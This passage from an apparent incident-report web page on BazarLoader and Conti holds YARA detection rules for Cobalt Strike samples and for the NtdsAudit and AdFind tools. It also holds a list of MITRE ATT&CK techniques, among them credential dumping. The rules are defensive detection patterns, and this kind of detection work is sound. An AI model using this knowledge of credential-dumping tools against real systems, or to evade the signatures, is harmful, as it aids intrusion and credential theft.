      <span class="hljs-variable">$s7</span> = <span class="hljs-string">",;<span class="hljs-variable">@O</span>:\""</span> fullword ascii 
      <span class="hljs-variable">$s8</span> = <span class="hljs-string">"ekX.cFm"</span> fullword ascii 
      <span class="hljs-variable">$s9</span> = <span class="hljs-string">":keftP"</span> fullword ascii 
      <span class="hljs-variable">$s10</span> = <span class="hljs-string">"&gt;FGirc"</span> fullword ascii 
      <span class="hljs-variable">$s11</span> = <span class="hljs-string">"&gt;-9 -D"</span> fullword ascii 
      <span class="hljs-variable">$s12</span> = <span class="hljs-string">"% /m_v?"</span> fullword ascii 
      <span class="hljs-variable">$s13</span> = <span class="hljs-string">"?\\+ X5"</span> fullword ascii 
      <span class="hljs-variable">$s14</span> = <span class="hljs-string">"Cyurvf7"</span> fullword ascii 
      <span class="hljs-variable">$s15</span> = <span class="hljs-string">"~<span class="hljs-variable">%f_</span><span class="hljs-variable">%Cfcs</span>"</span> fullword ascii 
      <span class="hljs-variable">$s16</span> = <span class="hljs-string">"wV^X(P+ "</span> fullword ascii 
      <span class="hljs-variable">$s17</span> = <span class="hljs-string">"\\Ej0drBTC8E=oF"</span> fullword ascii 
      <span class="hljs-variable">$s18</span> = <span class="hljs-string">"W00O~AK_="</span> fullword ascii 
      <span class="hljs-variable">$s19</span> = <span class="hljs-string">"D( -m}w"</span> fullword ascii 
      <span class="hljs-variable">$s20</span> = <span class="hljs-string">"avAoInJ1"</span> fullword ascii 
   condition: 
      uint16(<span class="hljs-number">0</span>) == <span class="hljs-number">0x5a4d</span> <span class="hljs-keyword">and</span> filesize &lt; <span class="hljs-number">11000</span>KB <span class="hljs-keyword">and</span> 
      <span class="hljs-number">1</span> of (<span class="hljs-variable">$x</span>*) <span class="hljs-keyword">and</span> <span class="hljs-number">4</span> of them 
} 

rule cobalt_strike_dll21_5426 { 
   meta: 
      description = <span class="hljs-string">"files - 21.dll"</span> 
      author = <span class="hljs-string">"TheDFIRReport"</span> 
      date = <span class="hljs-string">"2021-07-25"</span> 
      hash1 = <span class="hljs-string">"96a74d4c951d3de30dbdaadceee0956682a37fcbbc7005d2e3bbd270fbd17c98"</span> 
   strings: 
      <span class="hljs-variable">$s1</span> = <span class="hljs-string">"AWAVAUATVWUSH"</span> fullword ascii 
      <span class="hljs-variable">$s2</span> = <span class="hljs-string">"UAWAVVWSPH"</span> fullword ascii 
      <span class="hljs-variable">$s3</span> = <span class="hljs-string">"AWAVAUATVWUSPE"</span> fullword ascii 
      <span class="hljs-variable">$s4</span> = <span class="hljs-string">"UAWAVATVWSH"</span> fullword ascii 
      <span class="hljs-variable">$s5</span> = <span class="hljs-string">"AWAVVWUSH"</span> fullword ascii 
      <span class="hljs-variable">$s6</span> = <span class="hljs-string">"UAWAVAUATVWSH"</span> fullword ascii 
      <span class="hljs-variable">$s7</span> = <span class="hljs-string">"AVVWSH"</span> fullword ascii 
      <span class="hljs-variable">$s8</span> = <span class="hljs-string">"m1t6h/o*i-j2p2g7i0r.q6j3p,j2l2s7p/s9j-q0f9f,i7r2g1h*i8r5h7g/q9j4h*o7i4r9f7f3g*p/q7o1e5n8m1q4n.e+n0i*r/i*k2q-g0p-n+q7l3s6h-h6j*q/"</span> ascii 
      <span class="hljs-variable">$s9</span> = <span class="hljs-string">"s-e6m/f-g*j.i8p1g6j*i,o1s9o5f8r-p1l1k4o9n9l-s7q8g+n,f4t0q,f6n9q5s5e6i-f*e6q-r6g8s1o6r0k+h6p9i4f6p4s6l,g0p1j6l4s1l4h2f,s9p8t5t/g6"</span> ascii 
      <span class="hljs-variable">$s10</span> = <span class="hljs-string">"o1s1s9i2s.f1g5l6g5o2k8h*e9j2o3k0j1f+n,k9h5l*e8p*s2k5r3j-f5o-f,g+e*s-e9h7e.t0e-h3e2t1f8j5k/m9p6n/j3h9e1k3h.t6h2g1p.l*q8o*t9l6p4s."</span> ascii 
      <span class="hljs-variable">$s11</span> = <span class="hljs-string">"k7s9g7m5k4s5o3h6k.s1p.h9k.s-o8e*f5n9r,l4f-s5k3p2f/n1r.i*f*n-p4s3e7m9p2t/e3m5g1s9e0m1q/j*e*m-r*i+h.p9s2f6h-p5s6e2h8p1s*j.h3p-s.h0"</span> ascii 
      <span class="hljs-variable">$s12</span> = <span class="hljs-string">"k9g9o0t1s4k*k*h.s-p-k.h-m1k*f4h0j7f6n,i5g-n3h+l3n1j7j0e*n5r6r-i9i/e1q4m6i3e2o8j9h9e0m.r-i9m*t4j/r.o*l8m4i.t5l,g-h0p6f7l+p-l3l,g."</span> ascii 
      <span class="hljs-variable">$s13</span> = <span class="hljs-string">"s6k9n/j.s4s5g2p6s.k1t/j6s,s-g*p.n6f9m/g.n4n5j2q6n.f1p/g6n,n-j*q.m6e9o/h.m4m5i2r6m.e1p/h6m,m-i*r.p6h9m/e.p4p5l2s6p.h1l/e7p,p-l*s."</span> ascii 
      <span class="hljs-variable">$s14</span> = <span class="hljs-string">"r4k7g8t-k4o6m,o1s1k.k1s6o,h8k-s4j8q*m+f/i*q/f3m-r5j2n0f0i*q0m/e0j5q7n5f4j7q3n7f1m4g2s,g5s5l9h7s9p1o.t8k5r-j3t.k8h1t6r7m-l5h5t1l*"</span> ascii 
      <span class="hljs-variable">$s15</span> = <span class="hljs-string">"k8s9n7o9k5s5o9m2k0s1m3m.k,s-n+o-f9n9t+t6f4n5o6t2f0n1s/r1f-n-o.t*e8m9i-s6e4m5t3q5e1m1i5s.e,m-k0s*h8p9q7t9h5p5j8r2h0p1h+r.h,p-q+t-"</span> ascii 
      <span class="hljs-variable">$s16</span> = <span class="hljs-string">"o9g6g0l0s1e6h4p-g6s9s9p1m1k*s3l-t5s.f8m5r5f6n+i2j8f*h,p5j2r.h0h1q9i6e8r-i*n8m-r5s-l.i8f2i1k.o4n1t9l6l0g,p9j6f,g.l-j*n0o-t-l*p5s-"</span> ascii 
      <span class="hljs-variable">$s17</span> = <span class="hljs-string">"t8n2i3e0i,l.i7i9e8r1j7o0n3i9j0m3m-l6e6s9r*l6s5h4t6n7o*k.r1f+r4l/q9g7i3o.m+t9q*g/j0h0e1n*m3i,h.e4n3i5n-r9g1h2k6m7j,e,p3p+h2o4f/h4"</span> ascii 
      <span class="hljs-variable">$s18</span> = <span class="hljs-string">"[_^A^A_]"</span> fullword ascii 
      <span class="hljs-variable">$s19</span> = <span class="hljs-string">"k9s9f+j*k3s5o-j/k/s1h/p5k-s-o7j7f7n9t/g+f3n5q/r8f1n1t7g3f+n-p.g8e7m9s3q4e5m5o+h0e/m1g-h4e+m-m+q0h9p9f/e,h3p5l6e1h/p1o7t,h-p-k+f5"</span> ascii 
      <span class="hljs-variable">$s20</span> = <span class="hljs-string">"g8s9j0t4o,t+n3t1g0k9k1t,o5s0n+t9n6j+o0q2i4j6r1i3f,g+j2h1f2r1n-e9m,i2i7f3q4m-n7n4m.r.e1s*j,m5p/n0n6s8p9g/o7l3t+g.m.q.l7g6t,e-o/q."</span> ascii 
   condition: 
      uint16(<span class="hljs-number">0</span>) == <span class="hljs-number">0x5a4d</span> <span class="hljs-keyword">and</span> filesize &lt; <span class="hljs-number">2000</span>KB <span class="hljs-keyword">and</span> 
      <span class="hljs-number">8</span> of them 
} 

import <span class="hljs-string">"pe"</span> 

rule cobalt_strike_exe21 { 
   meta: 
      description = <span class="hljs-string">"files -  21.exe"</span> 
      author = <span class="hljs-string">"TheDFIRReport"</span> 
      date = <span class="hljs-string">"2021-07-25"</span> 
      hash1 = <span class="hljs-string">"972e38f7fa4c3c59634155debb6fb32eebda3c0e8e73f4cb264463708d378c39"</span> 
   strings: 
      <span class="hljs-variable">$s1</span> = <span class="hljs-string">"<span class="hljs-variable">%c</span><span class="hljs-variable">%c</span><span class="hljs-variable">%c</span><span class="hljs-variable">%c</span><span class="hljs-variable">%c</span><span class="hljs-variable">%c</span><span class="hljs-variable">%c</span><span class="hljs-variable">%c</span><span class="hljs-variable">%cMSSE</span>-<span class="hljs-variable">%d</span>-server"</span> fullword ascii 
      <span class="hljs-variable">$s2</span> = <span class="hljs-string">"  VirtualQuery failed for <span class="hljs-variable">%d</span> bytes at address <span class="hljs-variable">%p</span>"</span> fullword ascii 
      <span class="hljs-variable">$s3</span> = <span class="hljs-string">"1brrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrr"</span> ascii 
      <span class="hljs-variable">$s4</span> = <span class="hljs-string">"\\hzA\\Vza\\|z<span class="hljs-variable">%\</span>\2z/\\3z\"\\/z<span class="hljs-variable">%\</span>\/z8\\9z\"\\(zl\\3z\"\\9z4\\5z8\\|z.\\9z+\\5z\"\\qz)\\2z(\\|z:\\=z&gt;\\5z-\\&gt;z \\9z?\\QzF\\\\zL\\"</span> fullword ascii 
      <span class="hljs-variable">$s5</span> = <span class="hljs-string">"\\zL\\/z&gt;\\qz.\\=za\\0z-\\(z\"\\\\zL\\/z&gt;\\qz?\\,za\\?z5\\.z \\\\zL\\/z&gt;\\qz?\\,za\\0z-\\(z\"\\\\zL\\/z:\\qz*\\5zL\\\\zL\\/z:\\q"</span> ascii 
      <span class="hljs-variable">$s6</span> = <span class="hljs-string">"\\zL:\\zL"</span> fullword ascii 
      <span class="hljs-variable">$s7</span> = <span class="hljs-string">"\\\\z:\\\\z"</span> fullword ascii 
      <span class="hljs-variable">$s8</span> = <span class="hljs-string">"\\qz/\\3z!\\,z<span class="hljs-variable">%\</span>\0z)\\8zl\\tzc\\?z \\.ze\\|z*\\)z\"\\?z8\\5z#\\2zl\\:z&gt;\\3z!\\|z-\\|z\"\\=z8\\5z:\\9zl\\?z#\\2z?\\(z&gt;\\)z/\\(z#"</span> ascii 
      <span class="hljs-variable">$s9</span> = <span class="hljs-string">"qz&lt;\\<span class="hljs-variable">%zL</span>\\\\zL\\9z?\\qz?\\*zL\\\\zL\\9z?\\qz9\\<span class="hljs-variable">%zL</span>\\\\zL\\9z?\\qz:\\9zL\\\\zL\\9z8\\qz)\\9zL\\\\zL\\9z9\\qz)\\/zL\\\\zL\\:z-\\qz"</span> ascii 
      <span class="hljs-variable">$s10</span> = <span class="hljs-string">"zL\\\\zL\\0z:\\qz"</span> fullword ascii 
      <span class="hljs-variable">$s11</span> = <span class="hljs-string">"z-\\(z\"\\\\zL\\/z:\\qz"</span> fullword ascii 
      <span class="hljs-variable">$s12</span> = <span class="hljs-string">"  VirtualProtect failed with code 0x<span class="hljs-variable">%x</span>"</span> fullword ascii 
      <span class="hljs-variable">$s13</span> = <span class="hljs-string">"3\\)z'\\\\zL\\&gt;z)\\\\zL\\/z \\\\zL\\9z8\\\\zL\\0z:\\\\zL\\0z8\\\\zL\\:z-\\\\zL\\*z<span class="hljs-variable">%\</span>\\\zL\\4z5\\\\zL\\=z6\\\\zL\\9z9\\\\zL\\1z'"</span> ascii 
      <span class="hljs-variable">$s14</span> = <span class="hljs-string">"z#\\\\zL\\,z \\\\zL\\,z8\\\\zL\\.z#\\\\zL\\.z9\\\\zL\\4z&gt;\\\\zL\\/z'\\\\zL\\/z=\\\\zL\\/z:\\\\zL\\(z<span class="hljs-variable">$\</span>\\\zL\\(z&gt;\\\\zL\\)z&gt;\\\\z"</span> ascii 
      <span class="hljs-variable">$s15</span> = <span class="hljs-string">"qz \\5zL\\\\zL\\8z)\\qz \\)zL\\\\zL\\8z<span class="hljs-variable">%\</span>\*za\\1z:\\\\zL\\9z \\qz+\\.zL\\\\zL\\9z\"\\qz-\\)zL\\\\zL\\9z\"\\qz.\\&amp;zL\\\\zL\\9z\""</span> ascii 
      <span class="hljs-variable">$s16</span> = <span class="hljs-string">"qz&lt;\\7zL\\\\zL\\)z6\\qz9\\&amp;za\\?z5\\.z \\\\zL\\)z6\\qz9\\&amp;za\\0z-\\(z\"\\\\zL\\*z<span class="hljs-variable">%\</span>\qz:\\2zL\\\\zL\\<span class="hljs-variable">$z</span><span class="hljs-variable">$\</span>\qz6\\=zL\\\\zL\\&amp;z<span class="hljs-variable">$\</span>\qz"</span> ascii 
      <span class="hljs-variable">$s17</span> = <span class="hljs-string">"qz'\\.zL\\\\zL\\7z5\\qz'\\;zL\\\\zL\\0z8\\qz \\(zL\\\\zL\\0z:\\qz \\*zL\\\\zL\\1z<span class="hljs-variable">%\</span>\qz\"\\&amp;zL\\\\zL\\1z'\\qz!\\7zL\\\\zL\\1z \\q"</span> ascii 
      <span class="hljs-variable">$s18</span> = <span class="hljs-string">"]zL\\=z*\\qz6\\=zL\\\\zL\\=z&gt;\\qz-\\9zL\\\\zL\\=z&gt;\\qz.\\4zL\\\\zL\\=z&gt;\\qz(\\&amp;zL\\\\zL\\=z&gt;\\qz)\\;zL\\\\zL\\=z&gt;\\qz<span class="hljs-variable">%\</span>\-zL\\\\z"</span> ascii 
      <span class="hljs-variable">$s19</span> = <span class="hljs-string">"  Unknown pseudo relocation protocol version <span class="hljs-variable">%d</span>."</span> fullword ascii 
      <span class="hljs-variable">$s20</span> = <span class="hljs-string">"\\L*L\\]qN\\WHKl]qO\\W{j\\XJL\\][G\\}"</span> fullword ascii 
   condition: 
      uint16(<span class="hljs-number">0</span>) == <span class="hljs-number">0x5a4d</span> <span class="hljs-keyword">and</span> filesize &lt; <span class="hljs-number">800</span>KB <span class="hljs-keyword">and</span> (pe.imphash()==<span class="hljs-string">"17b461a082950fc6332228572138b80c"</span> <span class="hljs-keyword">or</span>  
<span class="hljs-number">8</span> of them) 
} 

rule informational_NtdsAudit_AD_Audit_Tool { 
   meta: 
      description = <span class="hljs-string">"files - NtdsAudit.exe"</span> 
      author = <span class="hljs-string">"TheDFIRReport"</span> 
      date = <span class="hljs-string">"2021-07-25"</span> 
      hash1 = <span class="hljs-string">"fb49dce92f9a028a1da3045f705a574f3c1997fe947e2c69699b17f07e5a552b"</span> 
   strings: 
      <span class="hljs-variable">$x1</span> = <span class="hljs-string">"WARNING: Use of the --pwdump option will result in decryption of password hashes using the System Key."</span> fullword wide 
      <span class="hljs-variable">$s2</span> = <span class="hljs-string">"costura.nlog.dll.compressed"</span> fullword wide 
      <span class="hljs-variable">$s3</span> = <span class="hljs-string">"costura.microsoft.extensions.commandlineutils.dll.compressed"</span> fullword wide 
      <span class="hljs-variable">$s4</span> = <span class="hljs-string">"Password hashes have only been dumped for the \"{0}\" domain."</span> fullword wide 
      <span class="hljs-variable">$s5</span> = <span class="hljs-string">"The NTDS file contains user accounts with passwords stored using reversible encryption. Use the --dump-reversible option to outp"</span> wide 
      <span class="hljs-variable">$s6</span> = <span class="hljs-string">"costura.system.valuetuple.dll.compressed"</span> fullword wide 
      <span class="hljs-variable">$s7</span> = <span class="hljs-string">"TargetRNtdsAudit.NTCrypto.#DecryptDataUsingAes(System.Byte[],System.Byte[],System.Byte[])T"</span> fullword ascii 
      <span class="hljs-variable">$s8</span> = <span class="hljs-string">"c:\\Code\\NtdsAudit\\src\\NtdsAudit\\obj\\Release\\NtdsAudit.pdb"</span> fullword ascii 
      <span class="hljs-variable">$s9</span> = <span class="hljs-string">"NtdsAudit.exe"</span> fullword wide 
      <span class="hljs-variable">$s10</span> = <span class="hljs-string">"costura.esent.interop.dll.compressed"</span> fullword wide 
      <span class="hljs-variable">$s11</span> = <span class="hljs-string">"costura.costura.dll.compressed"</span> fullword wide 
      <span class="hljs-variable">$s12</span> = <span class="hljs-string">"costura.registry.dll.compressed"</span> fullword wide 
      <span class="hljs-variable">$s13</span> = <span class="hljs-string">"costura.nfluent.dll.compressed"</span> fullword wide 
      <span class="hljs-variable">$s14</span> = <span class="hljs-string">"dumphashes"</span> fullword ascii 
      <span class="hljs-variable">$s15</span> = <span class="hljs-string">"The path to output hashes in pwdump format."</span> fullword wide 
      <span class="hljs-variable">$s16</span> = <span class="hljs-string">"Microsoft.Extensions.CommandLineUtils"</span> fullword ascii 
      <span class="hljs-variable">$s17</span> = <span class="hljs-string">"If you require password hashes for other domains, please obtain the NTDS and SYSTEM files for each domain."</span> fullword wide 
      <span class="hljs-variable">$s18</span> = <span class="hljs-string">"microsoft.extensions.commandlineutils"</span> fullword wide 
      <span class="hljs-variable">$s19</span> = <span class="hljs-string">"-p | --pwdump &lt;file&gt;"</span> fullword wide 
      <span class="hljs-variable">$s20</span> = <span class="hljs-string">"get_ClearTextPassword"</span> fullword ascii 
   condition: 
      uint16(<span class="hljs-number">0</span>) == <span class="hljs-number">0x5a4d</span> <span class="hljs-keyword">and</span> filesize &lt; <span class="hljs-number">2000</span>KB <span class="hljs-keyword">and</span> 
      <span class="hljs-number">1</span> of (<span class="hljs-variable">$x</span>*) <span class="hljs-keyword">and</span> <span class="hljs-number">4</span> of them 
} 

rule informational_AdFind_AD_Recon_and_Admin_Tool {
   meta: 
      description = <span class="hljs-string">"files - AdFind.exe"</span> 
      author = <span class="hljs-string">"TheDFIRReport"</span> 
      date = <span class="hljs-string">"2021-07-25"</span> 
      hash1 = <span class="hljs-string">"b1102ed4bca6dae6f2f498ade2f73f76af527fa803f0e0b46e100d4cf5150682"</span> 
   strings: 
      <span class="hljs-variable">$s1</span> = <span class="hljs-string">"   -sc dumpugcinfo         Dump info for users/computers that have used UGC"</span> fullword ascii 
      <span class="hljs-variable">$s2</span> = <span class="hljs-string">"   -sc computers_pwdnotreqd Dump computers set with password not required."</span> fullword ascii 
      <span class="hljs-variable">$s3</span> = <span class="hljs-string">"   -sc computers_inactive  Dump computers that are disabled or password last set"</span> fullword ascii 
      <span class="hljs-variable">$s4</span> = <span class="hljs-string">"   -sc computers_active    Dump computers that are enabled and password last"</span> fullword ascii 
      <span class="hljs-variable">$s5</span> = <span class="hljs-string">"   -sc ridpool             Dump Decoded Rid Pool Info"</span> fullword ascii 
      <span class="hljs-variable">$s6</span> = <span class="hljs-string">"      Get top 10 quota users in decoded format"</span> fullword ascii 
      <span class="hljs-variable">$s7</span> = <span class="hljs-string">"   -po           Print options. This switch will dump to the command line"</span> fullword ascii 
      <span class="hljs-variable">$s8</span> = <span class="hljs-string">"ERROR: Couldn't properly encode password - "</span> fullword ascii 
      <span class="hljs-variable">$s9</span> = <span class="hljs-string">"   -sc users_accexpired    Dump accounts that are expired (NOT password expiration)."</span> fullword ascii 
      <span class="hljs-variable">$s10</span> = <span class="hljs-string">"   -sc users_disabled      Dump disabled users."</span> fullword ascii 
      <span class="hljs-variable">$s11</span> = <span class="hljs-string">"   -sc users_pwdnotreqd    Dump users set with password not required."</span> fullword ascii 
      <span class="hljs-variable">$s12</span> = <span class="hljs-string">"   -sc users_noexpire      Dump non-expiring users."</span> fullword ascii 
      <span class="hljs-variable">$s13</span> = <span class="hljs-string">"    adfind -default -rb ou=MyUsers -objfilefolder c:\\temp\\ad_out"</span> fullword ascii 
      <span class="hljs-variable">$s14</span> = <span class="hljs-string">"      Dump all Exchange objects and their SMTP proxyaddresses"</span> fullword ascii 
      <span class="hljs-variable">$s15</span> = <span class="hljs-string">"WLDAP32.DLL"</span> fullword ascii 
      <span class="hljs-variable">$s16</span> = <span class="hljs-string">"AdFind.exe"</span> fullword ascii 
      <span class="hljs-variable">$s17</span> = <span class="hljs-string">"                   duration attributes that will be decoded by the -tdc* switches."</span> fullword ascii 
      <span class="hljs-variable">$s18</span> = <span class="hljs-string">"   -int8time- xx Remove attribute(s) from list to be decoded as int8. Semicolon delimited."</span> fullword ascii 
      <span class="hljs-variable">$s19</span> = <span class="hljs-string">"replTopologyStayOfExecution"</span> fullword ascii 
      <span class="hljs-variable">$s20</span> = <span class="hljs-string">"<span class="hljs-variable">%s</span>: [<span class="hljs-variable">%s</span>] Error 0x<span class="hljs-variable">%0x</span> (<span class="hljs-variable">%d</span>) - <span class="hljs-variable">%s</span>"</span> fullword ascii 
   condition: 
      uint16(<span class="hljs-number">0</span>) == <span class="hljs-number">0x5a4d</span> <span class="hljs-keyword">and</span> filesize &lt; <span class="hljs-number">4000</span>KB <span class="hljs-keyword">and</span> 
      <span class="hljs-number">8</span> of them 
}
</code></pre>
<h4 id="mitre">MITRE</h4>
<ul>
<li>Phishing &#8211; T1566</li>
<li>Spearphishing Attachment &#8211; T1566.001</li>
<li>Domain Accounts &#8211; T1078.002</li>
<li>Command and Scripting Interpreter &#8211; T1059</li>
<li>User Execution &#8211; T1204</li>
<li>PowerShell &#8211; T1059.001</li>
<li>Windows Command Shell &#8211; T1059.003</li>
<li>Malicious File &#8211; T1204.002</li>
<li>Create Account &#8211; T1136</li>
<li>Valid Accounts &#8211; T1078</li>
<li>Local Account &#8211; T1087.001</li>
<li>Process Injection &#8211; T1055</li>
<li>Process Hollowing &#8211; T1055.012</li>
<li>Signed Binary Proxy Execution &#8211; T1218</li>
<li>Rundll32 &#8211; T1218.011</li>
<li>OS Credential Dumping &#8211; T1003</li>
<li>LSASS Memory &#8211; T1003.001</li>
<li>Cached Domain Credentials &#8211; T1003.005</li>
<li>Domain Trust Discovery &#8211; T1482</li>
<li>Account Discovery &#8211; T1087</li>
<li>File and Directory Discovery &#8211; T1083</li>
<li>Process Discovery &#8211; T1057</li>
<li>Network Share Discovery &#8211; T1135</li>
<li>Remote System Discovery &#8211; T1018</li>
<li>Software Discovery &#8211; T1518</li>
<li>System Owner/User Discovery &#8211; T1033</li>
<li>System Time Discovery &#8211; T1124</li>
<li>Lateral Tool Transfer &#8211; T1570</li>
<li>Remote Services &#8211; T1021</li>
<li>Remote Desktop Protocol &#8211; T1021.001</li>
<li>SMB/Windows Admin Shares &#8211; T1021.002</li>
<li>Windows Remote Management &#8211; T1021.006</li>
<li>Data from Local System &#8211; T1005</li>
<li>Data from Network Shared Drive &#8211; T1039</li>
<li>Data Staged &#8211; T1074</li>
<li>Local Data Staging &#8211; T1074.001</li>
<li>Remote Data Staging &#8211; T1074.002</li>
</ul>
<p>Internal case #5426</p>
</div>
<div class="sharedaddy sd-sharing-enabled"><div class="robots-nocontent sd-block sd-social sd-social-icon-text sd-sharing"><h3 class="sd-title">Share this:</h3><div class="sd-content"><ul><li class="share-twitter"><a rel="nofollow noopener noreferrer" data-shared="sharing-twitter-4173" class="share-twitter sd-button share-icon" href="https://thedfirreport.com/2021/10/04/bazarloader-and-the-conti-leaks/?share=twitter" target="_blank" title="Click to share on Twitter" ><span>Twitter</span></a></li><li class="share-linkedin"><a rel="nofollow noopener noreferrer" data-shared="sharing-linkedin-4173" class="share-linkedin sd-button share-icon" href="https://thedfirreport.com/2021/10/04/bazarloader-and-the-conti-leaks/?share=linkedin" target="_blank" title="Click to share on LinkedIn" ><span>LinkedIn</span></a></li><li class="share-reddit"><a rel="nofollow noopener noreferrer" data-shared="" class="share-reddit sd-button share-icon" href="https://thedfirreport.com/2021/10/04/bazarloader-and-the-conti-leaks/?share=reddit" target="_blank" title="Click to share on Reddit" ><span>Reddit</span></a></li><li class="share-facebook"><a rel="nofollow noopener noreferrer" data-shared="sharing-facebook-4173" class="share-facebook sd-button share-icon" href="https://thedfirreport.com/2021/10/04/bazarloader-and-the-conti-leaks/?share=facebook" target="_blank" title="Click to share on Facebook" ><span>Facebook</span></a></li><li class="share-jetpack-whatsapp"><a rel="nofollow noopener noreferrer" data-shared="" class="share-jetpack-whatsapp sd-button share-icon" href="https://thedfirreport.com/2021/10/04/bazarloader-and-the-conti-leaks/?share=jetpack-whatsapp" target="_blank" title="Click to share on WhatsApp" ><span>WhatsApp</span></a></li><li class="share-end"></li></ul></div></div></div>
<div id='jp-relatedposts' class='jp-relatedposts' >
	<h3 class="jp-relatedposts-headline"><em>Related</em></h3>
</div>
	</div><!-- .entry-content -->

	
		<footer class="entry-footer">
			<div class="entry-meta">

							</div><!-- .entry-meta -->
		</footer><!-- .entry-footer -->
			
		</div><!-- .entry-content-holder -->
</article><!-- #post-4173 -->

	<nav class="navigation post-navigation" aria-label="Posts">
		<h2 class="screen-reader-text">Post navigation</h2>
		<div class="nav-links"><div class="nav-previous"><a href="https://thedfirreport.com/2021/09/13/bazarloader-to-conti-ransomware-in-32-hours/" rel="prev">BazarLoader to Conti Ransomware in 32 Hours</a></div><div class="nav-next"><a href="https://thedfirreport.com/2021/10/18/icedid-to-xinglocker-ransomware-in-24-hours/" rel="next">IcedID to XingLocker Ransomware in 24 hours</a></div></div>
	</nav>
		</main><!-- #main -->
	</div><!-- #primary -->


<aside id="secondary" class="widget-area">
	<section id="search-4" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://thedfirreport.com/">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form></section><section id="google_translate_widget-5" class="widget widget_google_translate_widget"><div id="google_translate_element"></div></section><section id="block-7" class="widget widget_block">	<div class="wp-block-jetpack-subscriptions__supports-newline wp-block-jetpack-subscriptions">
		<div class="wp-block-jetpack-subscriptions__container is-not-subscriber">
							<form
					action="https://wordpress.com/email-subscriptions"
					method="post"
					accept-charset="utf-8"
					data-blog="175340963"
					data-post_access_level="everybody"
					data-subscriber_email=""
					id="subscribe-blog"
				>
					<div class="wp-block-jetpack-subscriptions__form-elements">
												<p id="subscribe-email">
							<label
								id="subscribe-field-label"
								for="subscribe-field"
								class="screen-reader-text"
							>
								Type your email…							</label>
							<input
									required="required"
									type="email"
									name="email"
									class="no-border-radius "
									style="font-size: 16px;padding: 15px 23px 15px 23px;border-radius: 0px;border-width: 1px;"
									placeholder="Type your email…"
									value=""
									id="subscribe-field"
									title="Please fill in this field."
								/>						</p>
												<p id="subscribe-submit"
													>
							<input type="hidden" name="action" value="subscribe"/>
							<input type="hidden" name="blog_id" value="175340963"/>
							<input type="hidden" name="source" value="https://thedfirreport.com/2021/10/04/bazarloader-and-the-conti-leaks/"/>
							<input type="hidden" name="sub-type" value="subscribe-block"/>
							<input type="hidden" name="app_source" value=""/>
							<input type="hidden" name="redirect_fragment" value="subscribe-blog"/>
							<input type="hidden" name="lang" value="en_US"/>
							<input type="hidden" id="_wpnonce" name="_wpnonce" value="5f8e4cdff7" /><input type="hidden" name="_wp_http_referer" value="/2021/10/04/bazarloader-and-the-conti-leaks/" /><input type="hidden" name="post_id" value="4173"/>							<button type="submit"
																	class="wp-block-button__link no-border-radius"
																									style="font-size: 16px;padding: 15px 23px 15px 23px;margin: 0; margin-left: 10px;border-radius: 0px;border-width: 1px;"
																name="jetpack_subscriptions_widget"
							>
								Subscribe							</button>
						</p>
					</div>
				</form>
								</div>
	</div>
	</section><section id="block-21" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://the-dfir-report-store.myshopify.com/products/dfir-labs-ctf-july-6-16-00-20-00-utc"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2024/06/ctf-1.png" alt="" class="wp-image-35571 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/ctf-1.png 200w, https://thedfirreport.com/wp-content/uploads/2024/06/ctf-1-150x150.png 150w" sizes="auto, (max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h4 class="wp-block-heading"><a href="https://the-dfir-report-store.myshopify.com/products/dfir-labs-ctf-july-6-16-00-20-00-utc">Register For Our Next CTF</a></h4>
</div></div>
</section><section id="block-8" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/monitor5-s.png" alt="" class="wp-image-21332 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/monitor5-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/monitor5-s-150x150.png 150w" sizes="auto, (max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/" data-type="link" data-id="https://thedfirreport.com/">Reports</a></h3>
</div></div>
</section><section id="block-9" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/threat-intelligence/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/cloud4-s.png" alt="" class="wp-image-21334 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/cloud4-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/cloud4-s-150x150.png 150w" sizes="auto, (max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></h3>
</div></div>
</section><section id="block-10" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/detection-rules/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/warning4-s.png" alt="" class="wp-image-21336 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/warning4-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/warning4-s-150x150.png 150w" sizes="auto, (max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></h3>
</div></div>
</section><section id="block-16" class="widget widget_block">
